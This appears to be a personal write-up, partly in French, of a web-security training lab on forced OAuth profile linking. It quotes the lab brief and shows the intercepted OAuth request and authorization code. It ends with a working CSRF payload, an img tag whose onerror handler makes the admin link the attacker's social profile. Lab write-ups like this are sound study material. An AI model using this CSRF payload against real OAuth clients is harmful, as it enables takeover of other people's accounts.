# Forced OAuth profile linking

```
 This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

    - Blog website account: wiener:peter
    - Social media profile: peter.wiener:hotdog
```

## Observations :

``` 
GET /auth?client_id=jg0t7jc74dkh09np3hh7e&redirect_uri=https://0a72008c033fb59c8ba3a214007200eb.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email
```
> redirection vers `https://0a72008c033fb59c8ba3a214007200eb.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email`

On intercept la requête avec notre code afin que l'admin lie son compte au notre : 

```
code=vU9Q5gmz1Obk1kq3hEcZU4nk3UuZbRVhbc-8qAjGEbW
```

### Création payload à envoyer depuis le serveur d'exploit :

```html
<img src="xmco" onerror="document.location='https://0a72008c033fb59c8ba3a214007200eb.web-security-academy.net/oauth-linking?code=vU9Q5gmz1Obk1kq3hEcZU4nk3UuZbRVhbc-8qAjGEbW'"/>
```

> SOLVED : GG WP ! :) 